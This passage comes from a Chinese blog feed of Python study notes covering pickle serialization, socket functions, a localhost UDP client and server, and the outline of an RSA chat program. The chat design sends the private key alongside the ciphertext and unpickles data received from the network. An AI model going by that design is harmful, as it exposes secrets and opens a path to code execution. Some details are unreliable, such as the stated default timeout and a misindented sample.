2"</span>, <span class="number">4</span>, <span class="number">5</span>)       </span><br><span class="line">part3 = Part(<span class="string">"Part 3"</span>, <span class="number">6</span>, <span class="number">7</span>)</span><br><span class="line"> </span><br><span class="line">bookTitle       = <span class="string">"Book yet to be written"</span>;</span><br><span class="line">bookISBN        = <span class="string">"XXX-X-XX-XXXXXX-X"</span>;</span><br><span class="line">bookParts       = [part1, part2, part3]</span><br><span class="line">bookChapters    = [<span class="string">"Chapter 1"</span>, <span class="string">"Chapter 2"</span>, <span class="string">"Chapter 3"</span>,</span><br><span class="line">                   <span class="string">"Chapter 4"</span>, <span class="string">"Chapter 5"</span>, <span class="string">"Chapter 6"</span>,</span><br><span class="line">                   <span class="string">"Chapter 7"</span>];</span><br><span class="line"></span><br><span class="line">book = Book(bookTitle, bookISBN, bookParts, bookChapters)</span><br><span class="line"><span class="comment"># 创建buffer存储pickle对象</span></span><br><span class="line">pickleBuffer = io.BytesIO()</span><br><span class="line">print(<span class="string">"Pickling of the object into the memory buffer started"</span>)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">pickle.dump(book,pickleBuffer)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Pickling of the object into the memory buffer ended"</span>)</span><br><span class="line">print(<span class="string">"Pickled buffer beginning address:"</span>)</span><br><span class="line">print(pickleBuffer.getbuffer())</span><br><span class="line">print(<span class="string">"Unpickling of the object from memory started"</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">unpickledBook = pickle.loads(pickleBuffer.getbuffer())</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Unpickling of the object from memory ended"</span>)</span><br><span class="line">print(<span class="string">"Printing the attributes of unpickled object"</span>)</span><br><span class="line">unpickledBook.identify()</span><br></pre></td></tr></table></figure></li></ul></li><li><p>pickle.dumps()参数</p><p>pickle.dumps(obj, protocol=None,*,fix_imports=True)</p><ul><li>与pickle.dump()区别，pickle.dumps()方法不需要写入文件中，他是直接返回一个序列化的bytes对象</li></ul></li></ul></li><li><p>==反序列化==语法</p><ul><li><p>pickle.load(file)</p><ul><li>反序列化对象（将文件中数据解析为一个Python对象）</li><li>==注意==：load(file)时，要让Python能够找到类的定义,否则会报错</li><li>注意：参数file，必须是以二进制的形式进行操作（读取）</li><li>示例：819test_pickle.py</li></ul></li><li><p>反序列方法pickle.loads()</p><ul><li><p>参数如下：</p><p>pickle.loads(bytes_object, *,fix_imports=True, encoding=”ASCII”. errors=”strict”)</p></li><li><p><code>pickle.loads()</code>方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.dumps([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="string">b'\x80\x03]q\x00(K\x01K\x02K\x03e.'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(_)</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#load(file)时，要让Python能够找到类的定义,否则会报错</span></span><br><span class="line"><span class="keyword">import</span> pickle  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n,a)</span>:</span>  </span><br><span class="line">        self.name=n  </span><br><span class="line">      self.age=a  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self)</span>:</span>  </span><br><span class="line">      print(self.name+<span class="string">" "</span>+str(self.age))  </span><br><span class="line">aa = Person(<span class="string">"JGood"</span>, <span class="number">2</span>)  </span><br><span class="line">aa.show()  </span><br><span class="line"><span class="comment"># del Person</span></span><br><span class="line">f=open(<span class="string">'p.txt'</span>,<span class="string">'wb'</span>)  </span><br><span class="line">pickle.dump(aa,f,<span class="number">0</span>)  </span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  注释掉删除类对象操作，若未注释则会报错</span><br><span class="line">del Person  </span><br><span class="line">  f&#x3D;open(&#39;p.txt&#39;,&#39;rb&#39;)  </span><br><span class="line">  bb&#x3D;pickle.load(f)  </span><br><span class="line">  f.close()  </span><br><span class="line">  bb.show()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ python 819test_pickle.py </span><br><span class="line">  JGood 2</span><br><span class="line">JGood 2</span><br></pre></td></tr></table></figure><p>未注释结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  (venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ python 819test_pickle.py </span><br><span class="line">  JGood 2</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File &quot;819test_pickle.py&quot;, line 15, in &lt;module&gt;</span><br><span class="line">      bb&#x3D;pickle.load(f)  </span><br><span class="line">  AttributeError: Can&#39;t get attribute &#39;Person&#39; on &lt;module &#39;__main__&#39; from &#39;819test_pickle.py&#39;&gt;</span><br><span class="line">  </span><br><span class="line">  [p.txt](p.txt)文件中数据存储格式：</span><br><span class="line">  </span><br><span class="line">  &#96;&#96;&#96;python</span><br><span class="line">  &gt;&gt;&gt; with open(&#39;p.txt&#39;,&#39;rb&#39;) as f:</span><br><span class="line">  ...     f.read()</span><br><span class="line">  ... </span><br><span class="line">  b&#39;ccopy_reg\n_reconstructor\np0\n(c__main__\nPerson\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVJGood\np7\nsVage\np8\nL2L\nsb.&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> python网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python网络编程01</title>
      <link href="/2020/03/14/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/"/>
      <url>/2020/03/14/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="学习内容"><a href="#学习内容" class="headerlink" title="学习内容"></a>学习内容</h2><ul><li>了解socket基本概念</li><li>利用socket类方法获取主机、网络及目标服务的信息</li><li>UDP、TCP客户端/服务器编写</li><li>案例：python SOCKET实现RSA加密的全双工聊天程序</li></ul><a id="more"></a><h2 id="学习步骤"><a href="#学习步骤" class="headerlink" title="学习步骤"></a>学习步骤</h2><h4 id="构建python环境"><a href="#构建python环境" class="headerlink" title="构建python环境"></a>构建python环境</h4><p>同时开发多个python应用程序（共用一个Python，不同版本的包不兼容会产生无用包），利用virtualenv创建“Python虚拟环境”（小型、独立的、隔离功能的Python环境），从而避免产生无用包</p><ul><li>利用virtualenvwrapper管理virtualenv虚拟环境<ul><li>mkvirtualenv venv ：创建虚拟环境venv</li><li>workon                       ：查看当前已有虚拟环境目录</li><li>workon venv            ：进入venv虚拟环境</li><li>deactivate                 ：退出虚拟环境</li><li>rmvirtualenv venv：删除虚拟环境venv</li></ul></li></ul><h4 id="socket概念"><a href="#socket概念" class="headerlink" title="socket概念"></a>socket概念</h4><ul><li>运行在不同机器上的进程通过套接字发送报文来进行通信，套接字充当了两个进程通信的“中间人”，观察下图（OSI模型中）：</li><li><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/socket.png" alt="socket"></li><li>套接字是个通信端点，操作系统使用整数来标识套接字，Python使用socket.socket对象表示套接字（该对象内部表示的是操作系统标识套接字的整数，可利用fileno()方法查看），调用socket.socket对象的方法请求使用套接字的系统调用是，该对象会自动使用内部维护的套接字整数标识符</li><li>socket.socket对象的fileno()方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> socket</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = socket.socket()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.fileno()</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><ul><li>IP地址、端口号<ul><li>端口号（port）传输层协议内容、用来标识一个进程</li><li>一个端口号只能被一个进程占用</li><li>IP地址 + 端口号能标识网络上的某一台主机的某一个进程</li></ul></li><li>套接字组成：IP地址和端口号就构成了一个网络中的唯一标识符，即套接字</li><li>套接字类型（常用的两种）<ul><li>流套接字：创建socket对象时（用socket.SOCK_STREAM）<ul><li>面向连接、可靠的数据传输服务。能够保证数据无差错、无重复、按顺序发送</li></ul></li><li>数据包套接字：创建socket对象时，使用socket.SOCK_DGRAM<ul><li>提供无连接服务。无需建立连接，只需将目的地址信息打包后发送；该服务使用UDP进行传输，延迟小且效率高，缺点不能保证数据传输的可靠性</li></ul></li></ul></li></ul><h4 id="利用socket类方法获取主机、网络及目标服务的信息"><a href="#利用socket类方法获取主机、网络及目标服务的信息" class="headerlink" title="利用socket类方法获取主机、网络及目标服务的信息"></a>利用socket类方法获取主机、网络及目标服务的信息</h4><ul><li><p>获取主机名、地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> socket</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.gethostname()</span><br><span class="line"><span class="string">'fishmouse'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.gethostbyname(_)</span><br><span class="line"><span class="string">'127.0.1.1'</span></span><br></pre></td></tr></table></figure></li><li><p>获取远程设备IP地址（如获取：<a href="http://www.baidu.com）" target="_blank" rel="noopener">www.baidu.com）</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.gethostbyname(<span class="string">'www.baidu.com'</span>)</span><br><span class="line"><span class="string">'14.215.177.38'</span></span><br></pre></td></tr></table></figure><p>可看到socket.gethostbyname具有==域名解析的作用==，ping一下看通不通</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ ping 14.215.177.38</span><br><span class="line">PING 14.215.177.38 (14.215.177.38) 56(84) bytes of data.</span><br><span class="line">64 bytes from 14.215.177.38: icmp_seq&#x3D;1 ttl&#x3D;55 time&#x3D;37.9 ms</span><br><span class="line">64 bytes from 14.215.177.38: icmp_seq&#x3D;2 ttl&#x3D;55 time&#x3D;39.4 ms</span><br><span class="line">64 bytes from 14.215.177.38: icmp_seq&#x3D;3 ttl&#x3D;55 time&#x3D;34.8 ms</span><br></pre></td></tr></table></figure></li><li><p>IP地址格式转换（打包成32位二进制格式）：socket类方法inet_aton、inet_ntoa</p><ul><li><p>inet_aton()使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip_addr =<span class="string">'127.0.0.1'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.inet_aton(ip_addr)</span><br><span class="line"><span class="string">b'\x7f\x00\x00\x01'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>binascii.hexlify(_)</span><br><span class="line"><span class="string">b'7f000001'</span></span><br></pre></td></tr></table></figure></li></ul><p>观察看到，转换后的32位二进制格式，并调用binasci.hexlify以16进制形式表示二进制数据</p><p>10进制结果，单个字节转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> struct</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>struct.unpack(<span class="string">'B'</span>,<span class="string">b'\x7f'</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="number">127</span></span><br></pre></td></tr></table></figure><ul><li><p>inet_ntoa()使用：32位二进制包转换为IPv4地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a的主机字节序----------网络字节序 ---------b的主机字节序&gt;&gt;&gt; ip_addr =<span class="string">'127.0.0.1'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.inet_aton(ip_addr)</span><br><span class="line"><span class="string">b'\x7f\x00\x00\x01'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.inet_ntoa(_)</span><br><span class="line"><span class="string">'127.0.0.1'</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>通过指定的端口和协议找到服务名</p><ul><li><p>socket.getservbyport()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">80</span>)</span><br><span class="line"><span class="string">'http'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">53</span>)</span><br><span class="line"><span class="string">'domain'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">25</span>)</span><br><span class="line"><span class="string">'smtp'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">21</span>)</span><br><span class="line"><span class="string">'ftp'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyport(<span class="number">3306</span>)</span><br><span class="line"><span class="string">'mysql'</span></span><br></pre></td></tr></table></figure></li><li><p>socket.getservbyname() ：通过服务名获取端口</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyname(<span class="string">'ssh'</span>)</span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.getservbyname(<span class="string">'http'</span>)</span><br><span class="line"><span class="number">80</span></span><br></pre></td></tr></table></figure><p>linux系统中，etc/services文件中可查看相关服务和端口</p></li><li><p>主机字节序和网络字节序之间的转换</p><p>不同主机a，b之间通信，数据格式需转换</p><p>a的固有数据存储——-标准化——–转化成b的固有格式</p><p>也即为：</p><p>==a的主机字节序———-网络字节序 ———b的主机字节序==</p><ul><li><p>主机字节序</p><p>主机内部，内存中数据的处理方式，可以分为两种：</p><ul><li><p>大端字节序：按照内存的增长方向，高位数据存储在高位内存中</p></li><li><p>小端字节序：按照内存的增长方向，高位数据存储在低位内存中</p><p><img src="python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B0%8F%E7%AB%AF.png" alt=""></p></li></ul></li><li><p>socket.ntohl()、socket.htonl()、ntohs()、htons()</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>data = <span class="number">1234</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.htonl(data)</span><br><span class="line"><span class="number">3523477504</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.htons(data)</span><br><span class="line"><span class="number">53764</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.ntohl(data)</span><br><span class="line"><span class="number">3523477504</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.ntohs(data)</span><br><span class="line"><span class="number">53764</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.ntohs(<span class="number">53764</span>)</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure><ul><li><p>设定并获取默认的套接字超时时间</p><ul><li><p>socket.gettimeout()、socket.settimeout()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = socket.socket()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.gettimeout()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.settimeout(<span class="number">100</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.gettimeout()</span><br><span class="line"><span class="number">100.0</span></span><br></pre></td></tr></table></figure><p>默认套接字超时时间为0</p></li></ul></li><li><p>套接字错误异常处理</p><ul><li>try…except  套接字异常类型 as 参数…</li></ul></li><li><p>argparse：命令项选项与参数解析的模块</p><ul><li>parser=argparse.ArgumentParser()：创建解析对象</li><li>parser.add_argument()：向对象中添加关注的命令行参数和选项</li><li>given_args = parser.parse_args()：对象解析</li></ul></li><li><p>套接字发送和接收的缓冲区大小修改</p><ul><li>socket中getsockopt()、setsockopt()方法</li></ul></li><li><p>套接字阻塞模式和非阻塞模式</p><ul><li>s= socket.socket()</li><li>s.setblocking(1)：设为阻塞模式</li><li>s.setblocking(0)：设为非阻塞模式</li></ul><p>默认情况下，TCP套接字处于阻塞模式</p></li></ul><h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><ul><li><p>多路复用：允许多个会话共享同一介质或机制的一种解决方案</p></li><li><p>UDP支持多路复用：UDP协议提供端口号，用于对目标为同一机器上不同服务的多个数据包进行适当的多路分解</p></li><li><p>TCP：多路复用、可靠传输</p></li><li><p>UDP机制：仅使用IP地址和端口进行标识，以此将数据包发送至目标地址</p></li><li><p>使用自环接口的UDP服务器和 客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># UDP client and server on localhost</span></span><br><span class="line"><span class="comment"># 814udp_local.py </span></span><br><span class="line"><span class="keyword">import</span> argparse, socket</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">MAX_BYTES = <span class="number">65535</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># server</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span><span class="params">(port)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">    sock.bind((<span class="string">'127.0.0.1'</span>,port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># getsockname()返回sock示例对象的（地址，端口)</span></span><br><span class="line">    print(<span class="string">"Listening at &#123;&#125;"</span>.format(sock.getsockname()))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data, address = sock.recvfrom(MAX_BYTES)</span><br><span class="line">        text = data.decode(<span class="string">'ascii'</span>)</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">"The client at &#123;&#125; says &#123;!r&#125;"</span>.format(address,text))</span><br><span class="line"></span><br><span class="line">        text = <span class="string">'Your data was &#123;&#125; bytes long '</span>.format(len(data))</span><br><span class="line">        data = text.encode(<span class="string">'ascii'</span>)</span><br><span class="line">        sock.sendto(data,address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span><span class="params">(port)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    text = <span class="string">'The time is &#123;&#125;'</span>.format(datetime.now())</span><br><span class="line">    data = text.encode(<span class="string">'ascii'</span>)</span><br><span class="line">   </span><br><span class="line">    sock.sendto(data,(<span class="string">'127.0.0.1'</span>,port))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># sock.getsockname()获取当前进程的（地址，端口）元组信息</span></span><br><span class="line">    print(<span class="string">'The OS assigned me the address &#123;&#125;'</span>.format(sock.getsockname()))</span><br><span class="line">    data, address = sock.recvfrom(MAX_BYTES)</span><br><span class="line"></span><br><span class="line">    text = data.decode()</span><br><span class="line">    <span class="comment"># format格式化字符串</span></span><br><span class="line">    print(<span class="string">'The server &#123;&#125; replied &#123;!r&#125;'</span>.format(address,text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 字典</span></span><br><span class="line">    choices = &#123;<span class="string">'client'</span>:client,<span class="string">'server'</span>:server&#125;</span><br><span class="line">    <span class="comment"># 创建参数解析对象</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Send and receive UDP locally'</span>)</span><br><span class="line">    <span class="comment">#添加要解析的参数</span></span><br><span class="line">    parser.add_argument(<span class="string">'role'</span>,choices=choices,help =<span class="string">'which role to play'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>,metavar=<span class="string">'PORT'</span>,type=int,default=<span class="number">1060</span>,help=<span class="string">'UDP port (default 1060)'</span>)</span><br><span class="line">    <span class="comment"># 参数解析</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 调用服务端或客户端函数</span></span><br><span class="line">    function = choices[args.role]</span><br><span class="line">    function(args.p)</span><br></pre></td></tr></table></figure><ul><li><p>先运行服务端</p><ul><li><p>python 814udp_local.py server</p><p>结果：</p><p>Listening at (‘127.0.0.1’, 1060)<br>The client at (‘127.0.0.1’, 60945) says ‘The time is 2019-08-16 16:34:56.276877’</p></li></ul></li><li><p>再运行客户端</p><ul><li><p>python 814udp_local.py client</p><p>The OS assigned me the address (‘0.0.0.0’, 60945)<br>The server (‘127.0.0.1’, 1060) replied ‘Your data was 38 bytes long ‘</p></li></ul></li><li><p>混杂客户端与垃圾回复</p><p>814udp_local.py代码中，客户端程序存在安全隐患，如fg果服务端响应延迟一会，攻击者伪装成服务器的一个响应，客户端并没有检查是否是真正服务器的响应</p><ul><li><p>先运行服务器，再将服务器暂停，创建一个快速发送信息的响应给客户端，再==fg命令==将暂停的服务器开启</p><p><img src="python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/%E6%B7%B7%E6%9D%82%E5%AE%A2%E6%88%B7%E7%AB%AF.png" alt=""></p></li><li><p>客户端</p><p><img src="python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/%E6%B7%B7%E6%9D%82%E5%AE%A2%E6%88%B7%E7%AB%AF1.png" alt=""></p><p>观察到，客户端收到的数据实际上是伪装的数据，真正的服务器的响应没到客户端</p></li><li><p>混杂客户端</p><p>不考虑地址是否正确，接收并处理所有收到的数据包的网络监听客户端在技术上叫 作混杂( promiscuous )客户端</p></li></ul></li></ul></li></ul><h4 id="python-SOCKET实现RSA加密的全双工聊天程序实现"><a href="#python-SOCKET实现RSA加密的全双工聊天程序实现" class="headerlink" title="python SOCKET实现RSA加密的全双工聊天程序实现"></a>python SOCKET实现RSA加密的全双工聊天程序实现</h4><ul><li><p>题目背景</p><p>RSA加密解密是利用非对称秘钥解决传输过程中机密性的问题，将之用在聊天程序上，其中使用rsa模块，发送方生产公钥和私钥，然后使用公钥将信息加密后，利用pickle模块封装加密后的消息和私钥，然后发送给接收方，接收方同样通过pickle模块将消息进行解封，使用发送过来的私钥将消息解密，并将内容打印在屏幕上</p></li><li><p>题目要点</p><ul><li><p>传输协议：TCP套接字创建客户端和服务端_</p><p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p></li><li><p>数据传输格式：pickle序列化数据</p><ul><li><p>pickle.dumps()序列化</p></li><li><p>pickle.loads()反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>encryptdata = <span class="string">'hello'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>key = <span class="number">882321</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message = pickle.dumps([encryptdata,key])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(message)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">bytes</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">message</span></span></span><br><span class="line"><span class="class"><span class="title">b</span>'\<span class="title">x80</span>\<span class="title">x03</span>]<span class="title">q</span>\<span class="title">x00</span><span class="params">(X\x05\x00\x00\x00helloq\x01J\x91v\r\x00e.<span class="string">'</span></span></span></span><br><span class="line"><span class="class"><span class="params"><span class="string">&gt;&gt;&gt; origndata = pickle.loads(message)</span></span></span></span><br><span class="line"><span class="class"><span class="params"><span class="string">&gt;&gt;&gt; origndata</span></span></span></span><br><span class="line"><span class="class"><span class="params"><span class="string">['</span>hello<span class="string">', 